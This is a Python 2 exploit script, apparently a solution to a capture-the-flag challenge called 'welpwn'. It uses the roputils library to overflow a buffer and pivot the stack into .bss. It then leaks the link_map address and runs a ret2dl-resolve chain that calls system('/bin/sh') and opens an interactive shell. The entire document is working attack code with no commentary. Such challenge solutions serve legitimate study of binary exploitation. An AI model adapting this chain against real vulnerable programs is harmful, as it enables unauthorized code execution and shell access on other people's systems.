from roputils import *

fpath = './welpwn_932a4428ea8d4581431502ab7e66ea4b'

rop = ROP(fpath)
offset = 24
p4_ret = 0x0040089c
addr_stage = rop.section('.bss') + 0x400
ptr_ret = rop.search(rop.section('.fini'))

buf  = 'A' * offset
buf += p64(p4_ret)
buf += rop.call_chain_ptr(
    ['write', 1, rop.got()+8, 8],
    ['read', 0, addr_stage, 400]
, pivot=addr_stage)

p = Proc(rop.fpath)
p.write(buf)
print "[+] read: %r" % p.read(16)
addr_link_map = p.read_p64()
addr_dt_debug = addr_link_map + 0x1c8

buf = rop.call_chain_ptr(
    ['read', 0, addr_dt_debug, 8],
    [ptr_ret, addr_stage+380]
)
buf += rop.dl_resolve_call(addr_stage+300)
buf += rop.fill(300, buf)
buf += rop.dl_resolve_data(addr_stage+300, 'system')
buf += rop.fill(380, buf)
buf += rop.string('/bin/sh')
buf += rop.fill(400, buf)

p.write(buf)
p.write_p64(0)
p.interact(0)
